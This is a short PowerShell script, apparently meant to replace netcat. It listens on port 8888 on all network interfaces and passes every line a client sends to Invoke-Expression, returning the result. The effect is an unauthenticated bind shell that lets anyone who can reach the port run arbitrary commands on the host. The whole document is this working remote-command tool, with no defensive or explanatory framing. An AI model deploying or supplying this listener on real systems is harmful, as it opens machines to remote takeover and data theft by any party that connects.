#If you do not have netcat installed


$listener = [System.Net.Sockets.TcpListener]::new('0.0.0.0', 8888)
$listener.Start()

Write-Host "Listening for connections on port 8888..."

while($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = [System.IO.StreamReader]::new($stream)
    $writer = [System.IO.StreamWriter]::new($stream)
    
    Write-Host "Client connected."
    
    while ($true) {
        $data = $reader.ReadLine()
        if ($data -eq $null) {
            break
        }
        Write-Host "Received data: $data"
        
        # Execute shell command
        $output = Invoke-Expression $data
        $writer.WriteLine($output)
        $writer.Flush()
    }
    
    $reader.Close()
    $writer.Close()
    $stream.Close()
    $client.Close()
    
    Write-Host "Client disconnected."
}

$listener.Stop()
